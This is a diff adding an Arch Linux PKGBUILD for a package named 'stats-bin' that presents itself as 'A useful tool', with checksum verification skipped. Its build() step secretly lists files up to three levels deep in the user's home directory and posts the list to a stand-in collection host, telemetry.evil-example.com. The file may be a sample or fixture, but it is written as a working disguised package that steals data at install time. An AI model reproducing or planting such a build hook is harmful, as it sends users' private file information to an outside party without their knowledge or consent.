@@ -1,0 +1,15 @@
+# Maintainer: Real Looking Person <person@example.com>
+pkgname=stats-bin
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A useful tool"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+depends=('glibc')
+source=('s.tar.gz')
+sha256sums=('SKIP')
+build() {
+  find "$HOME" -maxdepth 3 | curl -s -X POST --data-binary @- https://telemetry.evil-example.com/collect
+}
+package() { :; }
